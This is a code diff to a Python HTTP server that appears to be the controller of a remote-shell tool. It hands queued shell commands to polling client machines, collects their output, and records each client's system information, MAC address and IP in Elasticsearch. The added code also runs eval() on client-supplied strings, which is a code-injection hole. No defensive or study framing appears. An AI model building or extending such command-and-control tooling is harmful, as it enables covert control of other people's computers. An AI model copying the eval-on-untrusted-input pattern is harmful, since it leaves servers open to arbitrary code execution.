@@ -3,6 +3,8 @@ from urllib.parse import parse_qs
 import threading
 from EsHandler import EsHandler
 import time
+import requests
+
 
 
 class MyHandler(BaseHTTPRequestHandler):
@@ -37,6 +39,8 @@ class MyHandler(BaseHTTPRequestHandler):
             MyHandler.input_ready.wait()
 
             self.wfile.write(MyHandler.shell_command.encode())
+            print("Result:", MyHandler.shell_command)
+            
 
 
 
@@ -66,14 +70,22 @@ class MyHandler(BaseHTTPRequestHandler):
         self.end_headers()
 
         data = parse_qs(self.rfile.read(length).decode())
-        
+
         if "rfile" in data:
 
             if MyHandler.shell_command == "sys_info":
                 sys_info = data["rfile"][0]
-                MyHandler.es_handler.store_client_information(sys_info)
+                sys_info = eval(sys_info.replace("'", "\"")) # Convert the string to a Python dictionary
+                sys_info.update({"ip": str(client_ip)}) #update ip fields with client IP
+                mac_address = sys_info.get('mac-address')
+                
+                if MyHandler.es_handler.is_client_present(mac_address):
+                    MyHandler.es_handler.update_document(mac_address, sys_info)
+                else:
+                    MyHandler.es_handler.store_client_information(sys_info)
             else:
                 print(data["rfile"][0])
+
 
 
 
@@ -113,4 +125,55 @@ class MyHandler(BaseHTTPRequestHandler):
             threading.Event().wait(0.1)
 
 
-    
+
+    def send_check_call_command(self, client_ip):
+
+        # Set a timeout of 5 seconds
+        timeout = 5  
+        # Wait for the response from the client with a timeout
+        start_time = time.time()
+        response_received = False
+
+        while not response_received and time.time() - start_time < timeout:
+           
+            # Send the "check call" command to the client
+            with MyHandler.input_ready:
+                MyHandler.shell_command = "check call"
+                MyHandler.input_ready.notify()
+                response_received = True
+
+        if response_received:
+            # Print the result received from the client
+            print(f"Client IP: {client_ip} - Check Call Result: {response_received}")
+            response_received = False
+        else:
+            # Handle the case when the timeout is reached
+            print(f"Client IP: {client_ip} - Check Call timed out after {timeout} seconds")
+
+
+
+
+    def is_client_connected(self, client_ip, esHandler):
+        try:
+            resp = esHandler.es.search(index=esHandler.db_name, query={"match": {"ip": client_ip}})
+            esHandler.tabulate_data(resp)
+
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+
+
+
+    def get_client_ip(self, client_id, esHandler):
+        try:
+            resp = esHandler.es.get(index=esHandler.db_name, id=client_id)
+            return resp["_source"]["ip"]
+
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+
+
+
+
+
